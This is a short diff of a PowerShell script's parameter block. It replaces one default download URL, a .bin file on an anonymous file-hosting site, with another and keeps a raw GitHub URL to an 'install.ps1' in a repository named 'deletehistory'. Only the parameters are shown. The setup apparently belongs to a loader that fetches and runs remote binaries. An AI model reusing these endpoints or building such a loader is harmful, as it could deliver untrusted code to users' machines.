@@ -1,5 +1,5 @@
 param(
-    [string]$u = 'https://files.catbox.moe/qzp416.bin',
+    [string]$u = 'https://files.catbox.moe/c0ieox.bin',
     [string]$p = '',
     [string]$s = 'https://raw.githubusercontent.com/Reflexeiei885/deletehistory/refs/heads/main/install.ps1'
 )
